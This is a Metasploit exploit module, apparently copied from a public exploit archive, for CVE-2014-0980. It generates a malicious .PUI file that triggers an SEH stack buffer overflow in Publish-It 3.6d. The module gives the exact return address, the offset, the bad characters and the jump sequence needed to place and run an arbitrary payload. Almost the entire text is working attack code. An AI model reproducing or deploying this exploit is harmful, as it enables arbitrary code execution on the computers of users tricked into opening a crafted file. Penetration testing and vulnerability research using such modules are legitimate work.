# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;    => &#039;Publish-It PUI Buffer Overflow (SEH)&#039;,
      &#039;Description&#039;  => %q{
          This module exploits a stack based buffer overflow in Publish-It when
          processing a specially crafted .PUI file. This vulnerability could be
          exploited by a remote attacker to execute arbitrary code on the target
          machine by enticing a user of Publish-It to open a malicious .PUI file.
      },
      &#039;License&#039;    => MSF_LICENSE,
      &#039;Author&#039;    =>
        [
          &#039;Daniel Kazimirow&#039;,  # Original discovery
          &#039;Andrew Smith "jakx_"&#039;,  # Exploit and MSF Module
        ],
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;102911&#039; ],
          [ &#039;CVE&#039;, &#039;2014-0980&#039; ],
          [ &#039;EDB&#039;, &#039;31461&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;process&#039;,
        },
      &#039;Platform&#039;  => &#039;win&#039;,
      &#039;Payload&#039;  =>
        {
          &#039;BadChars&#039; => "\x00\x0b\x0a",
          &#039;DisableNops&#039; => true,
          &#039;Space&#039; => 377
        },
      &#039;Targets&#039;    =>
        [
          [ &#039;Publish-It 3.6d&#039;,
            {
              &#039;Ret&#039;     =>  0x0046e95a, #p/p/r | Publish.EXE
              &#039;Offset&#039;  =>  1082
            }
          ],
        ],
      &#039;Privileged&#039;  => false,
      &#039;DisclosureDate&#039;  => &#039;Feb 5 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options([OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;, &#039;msf.pui&#039;]),], self.class)
 
  end
 
  def exploit
 
    path = ::File.join(Msf::Config.data_directory, "exploits", "CVE-2014-0980.pui")
    fd = File.open(path, "rb")
    template_data = fd.read(fd.stat.size)
    fd.close
 
    buffer = template_data
    buffer << make_nops(700)
    buffer << payload.encoded
    buffer << make_nops(target[&#039;Offset&#039;]-payload.encoded.length-700-5)
    buffer << Rex::Arch::X86.jmp(&#039;$-399&#039;) #long negative jump -399
    buffer << Rex::Arch::X86.jmp_short(&#039;$-24&#039;) #nseh negative jump
    buffer << make_nops(2)
    buffer << [target.ret].pack("V")
 
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(buffer)
 
  end
end

